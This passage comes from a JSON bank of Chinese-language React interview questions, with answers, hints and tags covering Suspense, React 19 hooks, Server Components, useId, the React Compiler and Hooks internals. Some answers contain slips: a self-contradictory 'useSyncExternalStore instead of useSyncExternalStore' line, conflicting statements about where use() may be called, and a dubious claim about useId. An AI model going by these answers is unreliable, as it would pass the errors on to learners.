与传统 loading 状态管理相比的优势？React 18 的并发模式中 Suspense 的作用？Suspense 如何与错误边界配合？","answer":"答案：Suspense 让组件在等待异步操作时声明式显示 fallback。传统方式需要手动管理 if/else loading 状态，Suspense 消除了竞态条件和手工状态。React 18 并发模式下，Suspense 避免「loading 闪烁」——旧 UI 在等待期间保持可见。Suspense 和 Error Boundary 配合：Suspense 处理 loading，Error Boundary 处理错误。\n\n解析：工作原理——组件在数据未就绪时 throw 一个 Promise。React 向上冒泡找到最近的 Suspense 边界显示 fallback。Promise 完成后重新尝试渲染该组件。在并发模式下 React 可在等待时保持旧 UI，避免闪烁。\n\n使用场景——1）React.lazy 代码分割：const LazyComp = React.lazy(() => import('./Comp'))。Suspense 包裹待模块加载。2）数据获取：结合支持 Suspense 的框架（Relay、Next.js、React Router 的数据加载器）。3）流式 SSR（React 18+）：服务端逐步发送 HTML，Suspense 边界内内容独立流式传输。\n\n扩展延伸：并发模式核心——1）可中断渲染：高优先级更新打断低优先级渲染。2）useTransition：const [isPending, startTransition] = useTransition()——将非紧急更新标记为过渡，旧 UI 保持响应。3）useDeferredValue：延迟更新值，适合输入过滤。4）Error Boundary 与 Suspense 对比：Suspense 处理「还不在」的状态，Error Boundary 处理「出错了」的状态。两者可以嵌套组合。","hints":["Suspense 抛出一个 Promise 被最近的 Suspense 边界捕获显示 fallback","useTransition 和 useDeferredValue 在并发模式中的作用是什么"],"tags":["React","Suspense","并发模式","React 18","流式SSR"],"id":3472},{"category":"react","difficulty":"easy","type":"short_answer","title":"React Error Boundary 错误边界","content":"React Error Boundary 的作用是什么？如何创建和使用？它能捕获哪些错误？不能捕获哪些？React 19 的错误处理有什么变化？","answer":"答案：Error Boundary 是捕获子组件树中 JavaScript 错误、显示 fallback UI 而不崩溃整个应用的组件。通过实现 static getDerivedStateFromError() 和 componentDidCatch() 创建（必须用类组件）。捕获：渲染阶段、生命周期、构造函数中的错误。不能捕获：事件处理器、异步代码、SSR、Error Boundary 自身抛出的错误。\n\n解析：实现方式——1）class ErrorBoundary extends React.Component { state = { hasError: false }; static getDerivedStateFromError(error) { return { hasError: true } }; componentDidCatch(error, info) { logError(error, info) } }。2）getDerivedStateFromError 更新状态显示 fallback UI，componentDidCatch 用于副作用（日志上报）。\n\n使用建议——1）全局 Error Boundary 兜底 + 关键模块（聊天、支付）分别加边界隔离。2）细粒度边界好处：一个区域崩溃不影响其他区域。\n\n扩展延伸：无法捕获的错误处理——1）事件处理器：用 try/catch 包裹。2）异步代码：Promise 链加 .catch() 或 async/await 的 try/catch。3）React 19：引入了类似 react-error-boundary 库的模式，支持更灵活的错误处理 API。4）生产环境建议用 react-error-boundary 库（提供 withErrorBoundary、fallbackRender、reset 功能）。","hints":["Error Boundary 为什么必须用类组件——函数组件没有 getDerivedStateFromError","事件处理器中的错误为什么不能被 Error Boundary 捕获"],"tags":["React","Error Boundary","错误处理","类组件"],"id":3473},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 性能优化全攻略","content":"React 应用有哪些性能优化手段？React.memo、useMemo、useCallback 的原理和适用场景？虚拟列表和代码分割如何实现？如何诊断性能瓶颈？","answer":"答案：性能优化分为渲染优化（减少不必要重渲染）和加载优化（减少包体积）。核心 API：React.memo（浅比较 props）、useMemo（记忆化计算）、useCallback（记忆化函数引用）。虚拟列表用 react-window/react-virtuoso，代码分割用 React.lazy + Suspense。诊断工具：React DevTools Profiler。\n\n解析：优化原理——1）React.memo：高阶组件，对 props 做浅比较，未变则跳过渲染。不是对所有组件有效——只有重渲染成本高且 props 常不变时才用。2）useMemo(fn, deps)：deps 变化时重新计算，否则返回缓存值。用于跳过昂贵计算。3）useCallback(fn, deps)：等价于 useMemo(() => fn, deps)，返回缓存函数引用。配合 React.memo 避免子组件因函数引用变化重渲染。\n\n注意：useMemo/useCallback 本身有开销（依赖比较 + 内存），滥用反而降低性能。\n\n加载优化——1）React.lazy：const HeavyComp = React.lazy(() => import('./HeavyComp'))。2）基于路由的代码分割：每个页面对应一个 lazy 组件。3）资源预加载：rel=preload（关键资源）、rel=prefetch（未来导航）、rel=preconnect（第三方连接）。\n\n扩展延伸：诊断方法——1）React DevTools Profiler：录制交互查看每次 commit 的渲染耗时和原因。2）Chrome Performance：火焰图识别长任务和布局抖动。3）列表优化：虚拟列表适合 1000+ 行，100 行以内加 key 即可。4）状态提升 vs Context：多个无关组件共享状态用 Context 避免 prop drilling。","hints":["React.memo 对什么场景最有效——props 经常不变且渲染成本高的组件","useMemo/useCallback 为什么不能滥用——有自己的开销"],"tags":["React","性能优化","memo","useMemo","虚拟列表"],"id":3474},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 19 Actions 与 useActionState","content":"React 19 引入了 Actions 和 useActionState（原 useFormState）。请解释 Actions 的概念、useActionState 的用法，以及它如何简化表单处理。它与传统的受控组件 + useState 方案相比有什么优势？","answer":"答案：React 19 Actions 是处理异步状态转换的统一模式，useActionState 是基于 Actions 的表单状态管理 Hook。它允许在表单提交时自动管理 pending 状态、处理错误并获取最新返回数据，无需手动维护多个 state 变量。\n\n解析：Actions 的核心思想——任何异步操作（如表单提交、数据变更）都可以被包装为一个 Action 函数。Action 接收 formData 或参数，返回 Promise。React 会自动追踪其 pending 状态（isPending）和返回结果。useActionState 签名：const [state, formAction, isPending] = useActionState(fn, initialState)。formAction 可以直接传给 <form action={formAction}>，表单提交时会自动调用该函数。\n\n与受控组件 + useState 方案对比——传统方案：需要维护 loading/success/error/数据 四个 state 变量，手动处理 onSubmit → preventDefault → fetch → setState → 捕获异常 的流程。useActionState 方案：一个 Hook 搞定所有状态，isPending 自动切换，formAction 接管提交过程，state 自动获取服务器返回。代码量减少约 50%，且逻辑更集中。\n\n扩展延伸：useActionState 的进阶用法——结合 useOptimistic 实现乐观更新（先显示预期结果，服务器确认后修正）。结合 Server Actions（RSC 中的服务端函数）可以让表单直接在服务端处理数据，无需客户端 API 调用。注意：useActionState 的 formAction 需要配合原生表单的 action 属性，而非 onSubmit 事件——当然也可以用 submit 事件手动调用 formAction(formData)。React 19 中的 useTransition 也支持 Actions，可以用 startTransition 包裹非表单异步操作来获取 isPending 状态。","hints":["useActionState 如何同时管理 pending、error 和返回数据","Server Actions 与 useActionState 如何配合实现无 API 调用的表单提交"],"tags":["React","React 19","Actions","Hook"],"id":3475},{"category":"react","difficulty":"medium","type":"short_answer","title":"useOptimistic 实现乐观更新","content":"React 19 的 useOptimistic Hook 是做什么的？在什么场景下应该使用乐观更新？请描述使用 useOptimistic 实现即时 UI 更新的模式以及与回退（Rollback）机制的配合。","answer":"答案：useOptimistic 允许在异步操作完成前「乐观地」显示预期结果，提升用户体验。语法：const [optimisticState, setOptimistic] = useOptimistic(actualState, (currentState, optimisticValue) => newState)。\n\n解析：工作原理——useOptimistic 接受当前真实状态和一个更新函数。当调用 setOptimistic 时，立即用乐观值计算出新的 UI 状态并渲染。异步操作完成后，React 自动将状态回退到真实状态——如果操作成功，真实状态更新到与乐观状态一致；如果失败，状态回退到操作前的值。\n\n典型场景——1）社交应用的点赞/收藏：用户点击后立即点亮图标，然后发起网络请求。如果请求失败，图标恢复为未点亮状态并提示错误。2）即时通讯消息发送：用户发送消息后立即在聊天列表显示（标记为「发送中」），服务端确认后移除标记。3）Todo List 任务完成：勾选复选框后立即划掉，后台同步到服务器。\n\n与 useActionState 配合——useActionState 的 action 函数内调用 setOptimistic：await setOptimistic(optimisticValue); const result = await submitToServer(data); return result;。这样确保 UI 立即更新，服务端请求在后台并发执行。注意：乐观更新必须能够方便地回退——如果操作失败的后果不可逆或回退成本很高（如支付扣款），不应该使用乐观更新。\n\n扩展延伸：React 19 之前实现乐观更新需要手动维护 undo 队列和回退逻辑（保存快照、出错时恢复）。useOptimistic 让这一切标准化。实现原理：React 内部维护了一个「乐观更新栈」，当异步操作完成时自动清理对应的乐观更新。注意 setOptimistic 不会改变实际 state——它只在本次渲染中叠加乐观值，实际 state 仍由服务端或父组件控制。因此 optimisticState 不应作为持久化的数据来源。","hints":["乐观更新失败后怎么回滚到之前的状态","什么场景不适合用乐观更新"],"tags":["React","React 19","useOptimistic","Hook"],"id":3476},{"category":"react","difficulty":"medium","type":"short_answer","title":"use() Hook 直接读取 Promise 与 Context","content":"React 19 引入的 use() Hook 有什么特殊之处？它如何改变 Promise 和 Context 的读取方式？与 useEffect + useState 的异步数据获取模式相比有什么优势？","answer":"答案：use() 是 React 19 中一个全新的 Hook，可以同步读取 Promise（结合 Suspense）和 Context 的值，并且可以在条件语句和循环中使用——打破了传统 Hooks 的调用顺序规则。\n\n解析：use() 的两种用法——1）读取 Promise：const data = use(promise)。当 Promise 处于 pending 时，组件会抛出异常被最近的 Suspense 边界捕获显示 fallback；Promise resolve 后，组件自动重新渲染，use 返回数据。这实现了「声明式数据加载」：不需要 useEffect + loading state。2）读取 Context：const value = use(MyContext)。功能上等价于 useContext(MyContext)，但 use() 可以在条件语句中调用，解决了 Context 不能条件调用的限制。\n\n与 useEffect + useState 模式对比——传统模式：定义 state（loading/data/error）→ useEffect 内 fetch → setLoading/setData/setError → 处理竞态条件。use() + Suspense 模式：直接写 const data = use(fetchData())，Suspense 自动处理 loading，Error Boundary 自动处理 error，无需手动管理状态和竞态条件。代码更接近「同步写法」，心智负担更低。\n\n扩展延伸：use() 不遵循 Hooks 调用规则的原因——它不是一个「有状态」的 Hook（不向组件附加状态），而是一个「读取缓存」的工具。React 团队称其为「客户端数据读取原语」。使用限制：use() 不能用在组件顶层之外（如 useCallback、useEffect 内部），必须在渲染阶段调用。实践中通常将 use() 与 Suspense 配合使用，需要将异步数据加载包装在 Suspense 边界内。服务端组件中也可以使用 use() 读取异步数据，这是 RSC 数据获取的推荐方式之一。注意：use() 只负责「读取」——数据的获取（创建 Promise）需要在外部完成（如在组件外或 wrap 在 Suspense 的 fallback 外）。","hints":["为什么 use() 可以打破 Hooks 的执行顺序规则","use() + Suspense 如何消除 useEffect 中的竞态条件"],"tags":["React","React 19","use()","Suspense"],"id":3477},{"category":"react","difficulty":"easy","type":"short_answer","title":"useTransition 与过渡状态详解","content":"React 18+ 的 useTransition 和 startTransition 解决了什么问题？什么是过渡更新（Transition Update）？如何区分紧急更新和过渡更新？","answer":"答案：useTransition 用于将某些状态更新标记为「非紧急」的过渡更新，让 React 在紧急更新完成后才处理它们，从而保持 UI 在大量计算或状态变更时的响应性。返回 [isPending, startTransition]。\n\n解析：问题背景——在 React 中，所有 setState 默认都是紧急更新。这意味着当一个耗时操作（如输入框内容变化后过滤大量列表数据）触发渲染时，整个页面会卡住直到渲染完成。用户输入会变得迟钝。\n\n紧急 vs 过渡更新的区分——紧急更新：直接用户交互（输入、点击、拖动），需要立即响应。过渡更新：由紧急更新触发的衍生状态变化（如输入后的列表过滤结果），可以延迟处理。\n\n使用方式：startTransition(() => { setSearchQuery(input); });。React 会立即渲染紧急更新（输入框新值），将过渡更新（过滤后的列表）标记为低优先级。如果过程中有新的紧急更新，React 中断当前过渡渲染，处理紧急更新，然后重新开始过渡渲染。\n\n扩展延伸：useTransition vs useDeferredValue——useTransition 包装的是 setState 调用，useDeferredValue 包装的是值本身（const deferredQuery = useDeferredValue(query)）。两者本质原理相同（标记为低优先级/过渡），但使用场景不同：当你有权控制 setState 时用 useTransition，在 props 传入的值无法控制更新时机时用 useDeferredValue。Concurrent Features 的底层依赖 Fiber 架构的时间切片（Time Slicing）和可中断渲染（Interruptible Rendering），让 React 能在渲染过程中被更高优先级的更新打断。","hints":["useTransition 和 useDeferredValue 的使用场景有什么区别","Concurrent 模式下 React 如何实现可中断渲染"],"tags":["React","Concurrent","useTransition","性能"],"id":3478},{"category":"react","difficulty":"easy","type":"short_answer","title":"React Document Metadata 管理","content":"在 React 应用中如何管理页面级的元数据（文档标题 <title>、meta 描述、Open Graph 标签等）？React 19 提供了什么原生方案？有哪些第三方库可用？","answer":"答案：React 19 原生支持在组件树中的任意位置渲染 <title>、<meta> 等文档级标签，React 会自动将它们提升（Hoist）到 <head> 中。无需三方库即可管理元数据。\n\n解析：React 19 之前的方案——1）react-helmet（最流行但维护较少）2）react-helmet-async（helmet 的异步 fork，适合 SSR）3）next/head（Next.js 内置，用于在页面组件中自定义 <head>）4）@unhead/vue/vueuse-head（Vue 生态）——需要引入额外依赖，且可能存在元数据合并/覆盖的兼容性问题。\n\nReact 19 原生方案——直接在组件中写 <title>我的页面</title>，React 渲染时自动将其移动到 <head>。支持多个组件同时渲染 title 时，最后一个渲染的 title 生效（下层组件优先级 > 上层组件）。也支持 <meta>、<link>、<base> 等 head 标签。原理是在 DOM 子树中使用 portal 机制将 head 元素重定向到 <head> 节点（类似 <Head> 概念的原生化）。\n\n扩展延伸：SSR 场景下，原生方案会将 head 标签收集并在服务端渲染时注入到 HTML 中，自动处理客户端水合时的重复 head 标签去重。第三方库在以下场景仍有价值：1）复杂元数据模板（如 structured data JSON-LD 的动态生成）。2）元数据合并策略定制。3）需要向后兼容 React 18 及以下版本。4）微前端场景下的元数据隔离。原生方案的优势是零依赖、自动合并、和 React 渲染生命周期无缝集成。","hints":["React 19 原生元数据管理和 react-helmet 的关键区别是什么","SSR 场景下原生元数据管理如何避免 head 标签重复"],"tags":["React","React 19","SEO","元数据"],"id":3479},{"category":"react","difficulty":"hard","type":"short_answer","title":"useSyncExternalStore 原理与使用场景","content":"useSyncExternalStore 是 React 18 中新增的 Hook，它的设计目的是什么？解决了什么问题？在什么场景下需要使用它？","answer":"答案：useSyncExternalStore 是提供给外部状态库集成 React 的官方 Hook，确保外部 store 的更新在并发模式下能正确触发重渲染，避免 tearing（撕裂）问题。\n\n解析：tearing（视觉撕裂）问题——在 Concurrent Mode 下渲染过程可能被中断，如果外部 store 的值在中断期间发生变化，不同组件可能看到不同版本的值（tearing）。useSyncExternalStore 强制在同步时（commit 阶段）外部 store 的值与 React 保持一致。使用方式：const value = useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot?)——subscribe 订阅 store 变化回调，getSnapshot 返回当前快照值，getServerSnapshot 用于 SSR。React 内部通过 forceStoreRerender 机制在 subscribe 回调触发时标记组件需要重新渲染，并在 commit 阶段校验 getSnapshot 的返回值是否一致（如果值变化了会抛错提示缺少订阅）。\n\n扩展延伸：哪些库需要用它——1）Zustand：内部已使用了 useSyncExternalStore。2）Redux：@reduxjs/toolkit 中的 useSelector 在 React 18+ 中自动使用它。3）Valtio/Jotai：这些状态库都在底层依赖它。4）如果你想写一个自定义的外部状态管理，也应该用 useSyncExternalStore 而非 useSyncExternalStore（后者还有一个已废弃的 forceUpdate hack）。对比 useSyncExternalStore vs useState vs useReducer——useState/useReducer 是 React 内部状态，自然没有 tearing 问题。当状态在 React 树之外管理（如全局 store、浏览器 API、WebSocket 数据流）时，useSyncExternalStore 是最佳选择。","hints":["Concurrent Mode 下不使用 useSyncExternalStore 会有什么问题","useSyncExternalStore 的 getSnapshot 为什么要求返回不可变快照"],"tags":["React","Hooks","Concurrent Mode","外部状态"],"id":3480},{"category":"react","difficulty":"medium","type":"short_answer","title":"createRoot vs hydrateRoot","content":"React 18 中 createRoot 和 hydrateRoot 有什么区别？在什么场景下分别使用？hydrateRoot 的工作机制是什么？","answer":"答案：createRoot 用于客户端渲染（CSR），hydrateRoot 用于服务端渲染（SSR）后的水合（Hydration）。两者都是 React 18 中替换 ReactDOM.render 的新入口 API。\n\n解析：createRoot——创建一个 React 根节点，接管 DOM 节点的管理。调用 root.render(<App />) 渲染组件树。默认启用并发特性（Transitions、Automatic Batching、Suspense 等）。返回值 Root 对象有 render() 和 unmount() 方法。hydrateRoot——在 SSR 生成的静态 HTML 上附加事件监听和状态。工作原理：服务端返回的 HTML 被浏览器直接渲染（用户立即看到内容），然后 hydrateRoot 在客户端运行时复用已有的 DOM 节点，附加事件处理器和初始化状态，将静态 HTML 激活为可交互的应用。hydrateRoot 的约束——客户端第一次渲染的输出必须与服务端生成的 HTML 匹配（否则 React 会做一次全量重渲染）。React 18 的 hydrateRoot 相比 ReactDOM.hydrate 的改进：支持 selective hydration（选择性水合），允许用 Suspense 包裹的部分延迟水合。\n\n扩展延伸：SSR 架构演变——1）传统 SSR（React 16-17）：hydrate 一次完成所有组件的水合，大页面会阻塞交互。2）Streaming SSR（React 18）：renderToPipeableStream 支持流式传输 HTML，用户更快看到首屏。3）Selective Hydration：用 Suspense 包裹的组件可以按优先级分块水合，不需要全部加载完成。4）Server Components（React 19）：更进一步，部分组件在服务端完成渲染不发送 JavaScript 到客户端。选择策略：纯客户端应用用 createRoot；需要 SEO 和首屏性能的用 hydrateRoot + Streaming SSR；最新方案考虑 RSC（React Server Components）。","hints":["Hydration 不匹配（Mismatch）会发生什么","Selective Hydration 如何提升首屏交互体验"],"tags":["React","createRoot","hydrateRoot","SSR"],"id":3481},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Server Components 与流式渲染","content":"React Server Components（RSC）的核心设计理念是什么？它和传统 SSR 有何本质区别？流式渲染（Streaming SSR）如何工作？","answer":"答案：React Server Components 允许组件仅在服务端渲染，不发送 JavaScript 到客户端。传统 SSR 在服务端生成 HTML 但在客户端仍然需要水合所有组件的 JS；RSC 的服务端组件完全不需要客户端 JS，只发送渲染结果（序列化的 React 树）。\n\n解析：核心区别——传统 SSR：所有组件既是服务端组件也是客户端组件，都需要下载 JS 并在客户端水合。RSC：将组件分为服务端组件（只运行在服务端，可访问 DB/文件系统，不产生 JS bundle）和客户端组件（标注 'use client'，在客户端交互）。RSC 的序列化格式不是 HTML，而是一种特殊的 JSON 格式（React Flight），包含了虚拟 DOM 树的结构、客户端组件的位置和 props。流式渲染——renderToPipeableStream（Node.js）或 renderToReadableStream（Web Stream）将 HTML 分块传输给浏览器。Suspense 边界允许不重要的内容先返回 fallback（如 loading 骨架屏），重要内容先渲染。Streaming SSR + RSC 的组合使页面加载极快：服务端组件的结果和 HTML 同时逐步到达客户端。\n\n扩展延伸：RSC 的实际收益——1）零客户端开销：Markdown 渲染、日期格式化、权限校验等服务端做完，客户端不下载相关库。2）直接访问数据层：不再需要 REST/GraphQL 中间层，服务端组件直接读取数据库或文件系统。3）自动代码分割：客户端组件自动拆分为独立 chunk，按需加载。当前框架支持——Next.js App Router（默认 RSC）、Remix 的 loader（类似 RSC 理念但实现不同）。注意：RSC 不是替代传统 SSR 或 CSR，而是一种新的组件模型。对于交互密集型应用（如设计工具），大部分组件仍然是客户端组件。RSC 最适合的是数据获取和静态内容展示场景。","hints":["RSC 中服务端组件和客户端组件的边界在哪——为什么 'use client' 是传染性的","React Flight（RSC 的传输协议）和 HTML 有什么不同"],"tags":["React","Server Components","Streaming SSR","Next.js"],"id":3482},{"category":"react","difficulty":"hard","type":"short_answer","title":"useId 与 SSR Hydration 稳定性","content":"React 18+ 中 useId 的作用是什么？它如何解决 SSR 水合时 ID 不匹配的问题？和手动生成随机 ID 有什么区别？","answer":"答案：useId 是 React 18 引入的 Hook，用于生成在服务端和客户端一致的唯一 ID 字符串，解决 SSR 水合时 ID 不匹配的问题。\n\n解析：SSR ID 不匹配的问题——在客户端渲染时用 Math.random() 或 uuid 生成 ID 没问题，但在 SSR 场景下：1）服务端渲染时会生成一个随机 ID。2）客户端水合时 React 期望服务端 HTML 和客户端首次渲染完全一致。3）但 hydrateRoot 也会调用 useId，生成不同于服务端的 ID（因为 Math.random() 每次结果不同）。4）React 抛出 hydration mismatch 错误，并执行一次全量重渲染——意味着 SSR 的首次渲染优化完全失效。useId 的解决方案——useId 不与随机数相关，而是基于组件在组件树中的层级位置（类似一个路径）加上前缀生成 ID 字符串。在服务端和客户端，只要组件树结构相同，useId 生成的值就相同：服务端渲染用这个 ID，客户端水合也用这个 ID，完全匹配。useId 还考虑到了多应用共存（不同 root 前缀不同）和 fragment 元素。\n\n扩展延伸：useId 的格式——生成如 ':r1:'、':r2:' 这样的冒号包裹的字符串，确保在 CSS 选择器和 HTML id 属性中安全。使用场景：1）表单 label 的 htmlFor 和 input id 的关联：<label htmlFor={id}><input id={id} />。2）ARIA 属性的关联：aria-describedby、aria-labelledby。3）需要唯一 ID 的 SVG 元素。注意：useId 不适合用作列表渲染的 key（它生成的 ID 在组件重新排列时会变化）。如果确实需要全局唯一且稳定的 ID（如数据库主键），应该由服务端生成而非 useId。","hints":["useId 生成的 ID 是全局唯一的还是组件树内唯一的","为什么 Math.random() 不适合 SSR 场景下的 ID 生成"],"tags":["React","Hooks","useId","SSR","Hydration"],"id":3483},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Compiler 自动记忆化原理","content":"React Compiler（原 React Forget）是做什么的？它如何在编译阶段自动实现记忆化？这意味着开发者可以不再手动使用 useMemo/useCallback 吗？","answer":"答案：React Compiler 是 React 团队开发的编译时工具，在构建阶段自动分析组件中的值是否需要在重渲染时保持稳定（memoize），自动插入 useMemo/useCallback 调用，无需开发者手动优化。\n\n解析：工作原理——React Compiler 会构建一个「编译时记忆化」（Compile-time Memoization）的依赖分析图：1）分析组件中每个 JSX 片段和表达式，追踪它对哪些 props、state、hooks 返回值有依赖。2）如果一个值的依赖在两次渲染间没有变化，编译器自动将其结果缓存。3）一个值的缓存失效会传播到依赖它的其他值——比如某个 state 变化，只有依赖该 state 的 JSX 部分会标记为需要重渲染。与传统手动优化的区别——传统：开发者手动用 useMemo/useCallback/memo 包裹，需要理解引用相等性、闭包陷阱、何时真正需要优化。React Compiler：自动分析依赖图，确保更新粒度精确到「依赖变化的表达式」而非「整个组件」。\n\n扩展延伸：实际使用情况——React Compiler 目前（2025-2026）在 Instagram 的生产环境中已使用，但尚未作为正式发布版本对外提供。使用方式：Babel 插件或独立的编译工具，做「零改动接入」（理论上现有代码无需修改即可获得优化）。潜在挑战：1）不是所有代码模式都能被编译器正确分析——一些高度动态的模式（如 computed property names、Proxy 对象）可能需要开发者提供 hint。2）编译后的代码体积可能变大（因为插入了更多的缓存逻辑）。3）对于已手动优化良好的应用，收益不明显。长期愿景——React 团队希望编译器能完全消除 useMemo/useCallback/memo 的手动使用，让开发者专注于业务逻辑。但对性能关键路径，理解底层原理仍然重要。","hints":["React Compiler 怎么处理闭包中的过期值（Stale Closure）问题","编译时记忆化和运行时记忆化（如 useMemo）的区别是什么"],"tags":["React","Compiler","Memoization","React Forget"],"id":3484},{"category":"react","difficulty":"easy","type":"short_answer","title":"React 虚拟 DOM 与 Diff","content":"请介绍 React 虚拟 DOM（Virtual DOM）的工作原理。Virtual DOM 如何提高渲染性能？React 的 Diff 算法（Reconciliation）的策略有哪些？为什么需要 key 属性？","answer":"答案：虚拟 DOM 是真实 DOM 的轻量级 JS 对象表示，通过 Diff 算法最小化真实 DOM 操作。\n\n虚拟 DOM 工作流程：\n1. 状态变化 → 生成新的虚拟 DOM 树\n2. Diff 新旧两棵虚拟 DOM 树，找出差异（Reconciliation）\n3. 将差异批量更新到真实 DOM（Patch）\n\n为什么虚拟 DOM 是优化：\n- 真实 DOM 操作慢（DOM 的样式计算、布局、绘制开销大）\n- JS 对象操作快（创建虚拟 DOM 树的开销远小于真实 DOM 操作）\n- 虚拟 DOM 允许批量更新和最小化更新（不是每次状态变化都更新 DOM）\n\nReact Diff 算法的 3 个策略（O(n) 假设）：\n1. 不同类型的元素：如果根元素类型不同（div → span），直接卸载旧树，挂载新树\n2. 相同类型的 DOM 元素：只更新变化的属性，递归对比子节点\n3. 相同类型的组件：组件实例不变（state 保持），更新 props，递归对比\n\n为什么需要 key：\n- 没有 key 时，React 使用索引对比子节点（位置对比）\n- 列表重新排序时，位置对比会导致大量不必要的 DOM 操作\n- key 帮助 React 识别哪些元素被修改/移动/删除\n- 示例：\n  - 无 key：删除第一项后，后面的所有项都会重新渲染（以为内容变了）\n  - 有 key：React 通过 key 知道哪些项还在，只删除对应 DOM 节点\n- key 必须在兄弟节点中唯一，且稳定（不要用 index 作为 key！）\n\nFiber 架构（React 16+）：\n- 将 Diff/渲染过程拆分为可中断的 Fiber 节点\n- 优先级调度：高优先级的更新（用户输入）可以打断低优先级的更新（数据预加载）\n- 双缓存：current Fiber 树（当前 UI）+ workInProgress Fiber 树（下一次更新）\n\n扩展延伸：shouldComponentUpdate / React.memo / PureComponent——手动跳过不必要的渲染。React.memo 对函数组件做浅比较（shallow compare）。useMemo / useCallback——缓存计算结果和回调函数。大量列表的虚拟化（react-window / react-virtualized）。","hints":["虚拟 DOM = JS 对象树 + Diff（找最小差异）+ Patch（批量更新真实 DOM）","Diff 策略：根元素类型不同=卸载重建，相同=更新属性+递归子节点","key = 稳定标识（不要用 index），帮助 React 在列表重排时复用 DOM"],"tags":["React","虚拟DOM","Diff","Fiber"],"id":3485},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Hooks 原理","content":"请介绍 React Hooks 的实现原理。为什么 Hooks 不能在条件语句或循环中使用？useState 和 useEffect 在 Fiber 节点上是如何存储和执行的？","answer":"答案：Hooks 以链表形式存储在 Fiber 节点的 memorizedState 上，按调用顺序索引。\n\nHooks 的数据结构：\n- 每个组件对应一个 Fiber 节点\n- Fiber.memorizedState 指向一个 Hooks 链表\n- 每个 Hook 节点包含：next（指向下一个 Hook）、queue（更新队列）、baseState（当前值）\n\n为什么 Hooks 必须按固定顺序调用（不能在条件/循环中）：\n- React 每次渲染时按调用顺序遍历 Hooks 链表\n- 第一次渲染创建 Hooks 链表（useState → useEffect → useState...）\n- 后续渲染按调用顺序从链表中取对应的 Hook\n- 如果条件变化导致某个 Hook 没被调用 → 链表索引错位 → 数据混乱\n\n示例：\n// 第一次渲染：useState(0) → useEffect(...) → useState(\"hello\")\n// Hooks 链表：H1(0) → H2(effect) → H3(\"hello\")\n// 如果第二次渲染某个条件改变了，跳过了中间 useEffect：\n// useState(0) → useState(\"hello\")（这其实是 H2！但以为是 H3）\n\nuseState 的工作原理：\n1. 第一次渲染：用初始值创建 Hook 节点，添加到 Hooks 链表\n2. 更新时（setState 调用）：将更新添加到 Hook.queue（环形链表）\n3. 重新渲染时：遍历 Hook.queue，计算新的 state\n4. 多个 setState 被合并（批量更新）\n\nuseEffect 的工作原理：\n1. 第一次渲染：注册 effect（包含回调函数和依赖数组）\n2. 将 effect 添加到 Fiber.updateQueue\n3. DOM 更新后（commit 阶段）：遍历 effect 链表，执行前先清理上一次 effect\n4. 检查依赖数组是否变化（浅比较）→ 没变化则跳过执行\n\nReact 18 的 Hooks 改进：\n- useId：生成唯一的 ID（服务端渲染和客户端渲染一致）\n- useTransition：标记低优先级更新（不阻塞 UI）\n- useDeferredValue：延迟更新某个值（类似防抖）\n- useSyncExternalStore：外部存储的 concurrent mode 安全读取\n\n扩展延伸：自定义 Hooks——复用逻辑的推荐方式（代替 HOC 和 Render Props）。规律：自定义 Hook 以 use 开头。函数式组件每次渲染都会重新执行（Hooks 在每次渲染中按序执行），因此不要在 Hooks 以外改变组件状态。React 18 的自动批处理（Automatic Batching）——setState 自动合并，即使不在事件处理函数中。","hints":["Hooks 链表 = Fiber.memorizedState → H1 → H2 → H3（按调用顺序索引，不能条件调用）","useState：链表存储 → setState 加入队列 → 重渲染时遍历队列计算新值","useEffect：注册 effect（回调+依赖）→ DOM 更新后检查依赖 → 执行 or 跳过"],"tags":["React","Hooks","Fiber","useState"],"id":3486},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 状态管理","content":"请介绍 React 的状态管理方案。组件内状态（useState）、Context、Redux 和 Recoil/Zustand 各适用于什么场景？Redux 的中间件（middleware）如何工作？","answer":"答案：不同状态管理方案适合不同规模和复杂度的应用。\n\n状态分类：\n- 局部状态：单个或少量组件使用的状态 → useState / useReducer\n- 跨组件共享状态：多个组件需要访问同一状态 → Context / 状态管理库\n- 服务端状态：从 API 获取的数据 → React Query / SWR / RTK Query\n- URL 状态：路由参数 → React Router / Next.js Router\n\nuseState / useReducer：\n- 最简单的状态管理\n- useReducer 适合复杂的状态逻辑（多个子值相互依赖）\n- 局限：状态只在组件内部，共享需要 props drilling\n\nContext API：\n- 内置的跨组件状态传递（消除 props drilling）\n- 使用：createContext → Provider 提供值 → useContext 消费\n- 问题：\n  - Context 值变化时，所有消费该 Context 的组件都重新渲染\n  - 不适合高频更新的状态（每帧更新的动画数据）\n  - 没有中间件、DevTools 等高级功能\n- 适用：主题、语言、用户信息等低频更新的全局数据\n\nRedux：\n- 单向数据流：Action → Reducer → Store → View\n- 三大原则：单一真相源（Single Store）、状态只读（不可变更新）、纯函数 Reducer\n- Redux Toolkit（RTK，官方推荐）：\n  - createSlice（自动生成 action + reducer）\n  - createAsyncThunk（异步操作）\n  - RTK Query（服务端状态管理，替代 React Query）\n- 中间件：拦截 dispatch，扩展 Redux 的功能\n  - Redux Thunk：dispatch 函数（action 可以是函数）\n  - Redux Saga：通过 Generator 处理副作用\n  - logger：自动记录每个 action 的前后状态\n\n新型状态管理：\n- Zustand：小巧（1KB），无需 Provider，API 简洁，支持中间件\n- Recoil（Meta）：原子状态（Atom）+ 选择器（Selector），支持派生状态和异步查询\n- Jotai：类似 Recoil 但更轻量\n- 这些库解决了 Redux 的样板代码问题\n\n扩展延伸：React Query / SWR——管理服务端状态的缓存、预取、重新验证、乐观更新。与 Redux 的区别：React Query 专注于异步服务端状态，Redux 管理客户端全局状态。两者可以共存（React Query 取数据 + Redux 管理客户端状态，或 React Query 管理全部状态）。","hints":["useState（组件内）→ Context（跨组件直接）→ Redux（全局复杂状态/中间件）→ Zustand/Recoil（轻量级替代）","Redux = Action → Reducer → Store → View。RTK = createSlice + createAsyncThunk + RTK Query"],"tags":["React","状态管理","Redux","Context"],"id":3487},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 渲染优化","content":"请介绍 React 组件渲染的优化策略。React.memo、useMemo、useCallback 分别用于什么场景？如何分析组件不必要的重新渲染？","answer":"答案：React 